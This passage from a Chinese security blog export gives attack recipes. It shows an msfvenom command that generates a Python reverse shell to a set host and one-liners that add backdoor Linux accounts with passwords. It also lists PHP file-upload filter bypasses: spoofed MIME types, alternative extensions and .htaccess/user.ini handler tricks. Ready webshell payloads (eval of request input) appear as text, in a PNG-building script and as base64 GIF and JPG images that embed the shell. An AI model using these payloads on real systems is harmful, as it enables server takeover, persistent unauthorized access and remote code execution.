<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01bc2936c36f38c0e9.png" alt="https://p0.ssl.qhimg.com/t01bc2936c36f38c0e9.png"></p>
<h4 id="获取python一句话"><a href="#获取python一句话" class="headerlink" title="获取python一句话"></a><strong>获取python一句话</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01f8abd9cc27aac7ca.png" alt="https://p0.ssl.qhimg.com/t01f8abd9cc27aac7ca.png"></p>
<p>参考链接</p>
<p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html">https://www.cnblogs.com/LittleHann/p/12038070.html</a></p>
<p><a href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p>
<h1 id="一句话添加账号"><a href="#一句话添加账号" class="headerlink" title="一句话添加账号"></a><strong>一句话添加账号</strong></h1><p>你不是不给我提供交互的界面吗，那我就是使用脚本式的方法，使用一句话完成账号密码的添加，有关一句话账号密码的添加，笔者收集了以下几种方式。</p>
<p><strong>3.1.1 chpasswd 方法</strong></p>
<p><strong>（1）执行语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd newuser;echo &quot;newuser:password&quot;|chpasswd</span><br></pre></td></tr></table></figure>

<p><strong>（2）操作实例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line"></span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:$6$H0a/Nx.w$c2549uqXOULY4KvfCK6pTJQahhW7fuYYyHlo8HpnBxnUMtbXEbhgvFywwyPo5UsCbSUAMVvW9a7PsJB12TXPn.:17425:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p><strong>3.1.2 useradd -p 方法</strong></p>
<p><strong>（1） 执行语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd -p encrypted_password newuser</span><br></pre></td></tr></table></figure>

<p><strong>（2） 操作实例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd -p `openssl passwd 123456` guest</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:h8S5msqJLVTfo:17425:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p><strong>（3） 相同方法其他实现</strong></p>
<p> 相同方法不同实现一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd -p &quot;$(openssl passwd 123456)&quot; guest</span><br><span class="line">root@ifly-21171:~#</span><br></pre></td></tr></table></figure>

<p>相同方法不同实现二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_password=&quot;`openssl passwd 123456`&quot;</span><br><span class="line">useradd -p &quot;$user_password&quot; guest</span><br></pre></td></tr></table></figure>

<p><strong>3.1.3 echo -e 方法</strong></p>
<p>（1）执行语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</span><br></pre></td></tr></table></figure>

<p>（2） 操作实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd test;echo -e &quot;123456n123456n&quot; |passwd test</span><br><span class="line">Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:h/UnnFIjqKogw:17425:0:99999:7:::</span><br><span class="line">test:$6$rEjvwAb2$nJuZ1MDt0iKbW9nigp8g54ageiKBDuoLObLd1kWUC2FmLS0xCFFZmU4dzRtX/i2Ypm9uY6oKrSa9g</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传方式总结</title>
    <url>/2021/11/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><hr>
<h2 id="文件上传函数"><a href="#文件上传函数" class="headerlink" title="文件上传函数"></a>文件上传函数</h2><p>PHP中 使用 move_uploaded_file()函数来上传文件，该函数的语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool move_uploaded_file ( string ``$filename` `, string ``$destination` `)</span><br></pre></td></tr></table></figure>

<p>move_uploaded_file()函数是将上传文件储存到指定位置。如果成功，那么就会返回true，否则返回false。 参数 filename是上传文件的临时文件名，就是$S_FILES[tem_name]；参数 destination 是上传后保存的新的路径和名称。</p>
<h2 id="前端js绕过"><a href="#前端js绕过" class="headerlink" title="前端js绕过"></a>前端js绕过</h2><p>修改js 或 使用burpsuite 修改上传名</p>
<p>或是使用sources调试 ,修改js</p>
<p><strong>操作方式</strong>:</p>
<p>找到过滤的js代码, 将整个函数复制粘贴并修改, 在consles控制台回车即可</p>
<h2 id="服务器对MIME信息检测"><a href="#服务器对MIME信息检测" class="headerlink" title="服务器对MIME信息检测"></a>服务器对MIME信息检测</h2><p>修改Content-Type</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">image/jpeg  image/png  image/gif</span><br></pre></td></tr></table></figure>



<h2 id="后缀黑名单过滤"><a href="#后缀黑名单过滤" class="headerlink" title="后缀黑名单过滤"></a>后缀黑名单过滤</h2><p>修改为 其他不常见后缀名 , 或利用大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>  上传不常见的PHP扩展名来绕过黑名单</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pht, phpt, phtml, php3, php4, php5, php6,php7</span><br></pre></td></tr></table></figure>

<ul>
<li>  大小写绕过</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pHp, Php, phP</span><br></pre></td></tr></table></figure>





<h2 id="配置文件解析绕过"><a href="#配置文件解析绕过" class="headerlink" title="配置文件解析绕过"></a>配置文件解析绕过</h2><p><strong>Apache:</strong>  通过上传.htaccess文件使得.jpg等后缀文件被php解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;s.jpg&quot;&gt;</span><br><span class="line">Sethandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Nignx:</strong>   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.ini内容为：auto_prepend_file=12.jpg //在页面顶部加载文件</span><br><span class="line">user.ini内容为：auto_append_file=12.jpg  //在页面底部加载文件</span><br></pre></td></tr></table></figure>

<p><code>注意事项：user.ini文件一段时间后生效（5分钟左右）</code></p>
<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><p>二次渲染, 参照国光大佬博客的 <a href="https://www.sqlsec.com/2020/10/upload.html">文件上传总结</a></p>
<p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的</p>
<h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h3><p>渲染前后的两张 GIF，没有发生变化的空白数据部分直接插入<code>Webshell</code>即可</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211121124424741.png" alt="image-20211121124424741"></p>
<p>制作好的图片马 ,  <code>&lt;?php eval($_REQUEST[1]);?&gt;</code>  </p>
<p><img src="data:image/gif;base64,R0lGODlhMAAwAPUAAAICAhENDBcXFignJzIyKDc3N0VFRVNJTFdXV2dnZnh4eIiJiJiYmKeoqLi4t8jIyNLOy9nZ2eno6On07fPz6v39/QwZECAXHCEiHEBAPmZaWl5oZ7Bien6Afb50g8R6iaCgn9eJodGvrsC8ttOxsPKot/2vx8fR0P/G2uPd393h4Prp5Tw/cGhwIGV2YWwoJF9SRVFVRVNUWzFdKTs/PgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUP8/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG10YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPjxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53Lm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZjphYm91dD0iIiD/eG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1uczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE06SW5zdGFuY2VJRD0ieG1wLmlpZDpCRTNCNDI5NDJBQTcxMUU0OUFGQjk5NDg2MkVDRDM0RiIgeG1w/01NOkRvY3VtZW50SUQ9InhtcC5pZDpCRTNCNDI5NTJBQTcxMUU0OUFGQjk5NDg2MkVDRDM0RiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkJFM0I0MjkyMkFBNzExRTQ5RkI5OTQ4NjJFQ0QzNEYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkUzQjQyOTMyQUE3MTFFNDlBRkI5OTQ2MkVDRDM0RiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPHhwYWNrZXQgZW5kPSJyIv8/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMDAgEAACH/C1hNUCBEYXRhWE1Q/z94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjAtYzA2MCA2MS4xMzQ3NzcsIDIwMTAvMDIvMTItMTc6MzI6MDAgICAgICAgICI+PHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3Lncub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJmOmFib3V0PSIiIP94bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bW5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgeG1wTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJFM0I0Mjk0MkFBNzExRTQ5QUZCOTk0ODYyRUNEMzRGIiB4bXD/TU06RG9jdW1lbnRJRD0ieG1wLmlkOkJFM0I0Mjk1MkFBNzExRTQ5QUZCOTk0ODYyRUNEMzRGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkUzQjQyOTIyQUE3MTFFNDlGQjk5NDg2MkVDRDM0RiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCRTNCNDI5MzJBQTcxMUU0OUFGQjk5NDYyRUNEMzRGIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8eHBhY2tldCBlbmQ9InIi/z8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09HQz87NzMvKycjHxsXEw8LBwL++vby7urm4t7a1tLOysbCvrq2sq6qpqKempaSjoqGgn56dnJuamZiXlpWUk5KRkI+OjYyLiomIh4aFhIOCgYB/fn18e3p5eHd2dXRzcnFwb25tbGtqaWhnZmVkY2JhYF9eXVxbWllYV1ZVVFNSUVBPTk1MS0pJSEdGRURDQkFAPz49PDs6OTg3NjU0MzIxMC8uLSwrKikoJyYlJCMiISAfHh0cGxoZGBcWFRQTEhEQDw4NDAsKCQgHBgUEAwMCAQAAIfkEBAoA/wAsAAAAADAAMAAABv/AinBILBqPyKSySFk6n8imFJpsUonTq9YZkWyPVq0EIYh8z0NII0IAMCaOhPlLaVQkXucCQCgACgkBAHZfeQwIDk4OAAACjIwJeXQUCQALQhGJSHuPAAaSWw4FCwNuEgwDBUkRCY4AAw9Vep0JBoKqSGwBCppUYUMRroKMBXNHCo1oRpyMAQaxSY4KsloIAIIK0EiLAMYSIAkEAgHkAgN9CQzGR3sIhEoGf5itnfX1BAoQRwgBl0sRjBZIUEDOnsF6z4oI0paE04NSjBAsaPAAwokGCSAeBDBNyINrv5CUgijAHxgHGTb+abIHlxKAj4pVCGmkgb1hryS0MZmEwaP/A0KsUKA5hFuza48ItGEokpgQUEuQHVQwYQBRIh+vmUl09Ygre7HeRfHjJtirJBAY/GLWSUATiUGP2ORDgSyAXkSkClABzGACIeTWFXHlACYjO78gdFI7BGczOzD/HvHZiIJRAPqKdKBFpE2nAE0oBxAsxDNQw0CHWGELIm68TrgOPOLpcVhHBQJSG1HslMjrRx2/Wi0i1Q2UEelUC9HIKBHvR3gr2GWgjII9IZQfSX7qSBDtJRJipfCSvbfsTgOIOCgIAAEVFB5IrOBgooLnYf6+NpPUAKeACVCU8MEKIoSAwgj2bIVUJ72wxdETQ2WhkSACCFHcYkNcyAh1EA6hn8GCkAiRAAIG2PWgiAYhAGBXQ0wQj2PGiWIOeydWUMlBC7A4wQIWPOKYAApYk+IQN+J4RAQMnKeSSu6hCCJ6Q5ywwQEXLGnlNU1WoGE9oN0B40EDYGDAAOYohcAAjpnkoD12mKiSIOTA2Yh+xgnRn0ojXqnnI5lVAMGXnwG6p0FuEUHnoIg+YkARLybqaEBFrPnkoxsJ9oCglKpEABFBAAAh+QQFCgAWACwIAAQAKAAMAAAFdSBVjZVlnmiqrqtiSNVTMGRt33huAIgUAAkSa4hKLHAMAGAACDgaIqJU+RgxqpWJUskEHHPg2i+oABxIhK0ygA2HCwCBQ0kbldeJiFRaSajlIyZ0E3t7FQ4pAQYlhY0nEz9qCI6UJklNBAwSlZQNZhCcoQAqIQA7"></p>
<h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><p>PNG 可以将数据写入到 PLTE 数据块 或者 IDAT 数据块</p>
<h4 id="PLTE-数据块"><a href="#PLTE-数据块" class="headerlink" title="PLTE 数据块"></a>PLTE 数据块</h4><p>关于实现细节以前乌云知识库的一篇文章写的很详细，感兴趣的朋友可以阅读看看：</p>
<p><a href="https://wooyun.x10sec.org/static/drops/tips-16034.html">WooYun 乌云 - php imagecreatefrom* 系列函数之 png</a></p>
<p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终。</p>
<p>修改索引图像插入 PHP 代码的脚本项目地址为：<a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py">Github - poc_png.py</a></p>
<p>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure>

<h4 id="IDAT-数据块"><a href="#IDAT-数据块" class="headerlink" title="IDAT 数据块"></a>IDAT 数据块</h4><p>写入IDAT数据 进行绕过, 脚本如下: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h3><p>在 github 很容易就能找到这样的项目</p>
<p><strong>项目地址</strong>：<a href="https://github.com/BlackFan/jpg_payload">Github - lackFan/jpg_payload</a></p>
<p>准备一个 jpg 图片：</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_1495711556.jpg" alt="1495711556"></p>
<p>建议在Linux 下环境运行, windows 下容易报错, 且需要 开启一个拓展</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php 1.jpg</span><br></pre></td></tr></table></figure>



<p>得到新图片, payload: <code>&lt;?php @eval($_POST[1])?&gt;</code></p>
<p><img src="data:image/jpg;base64,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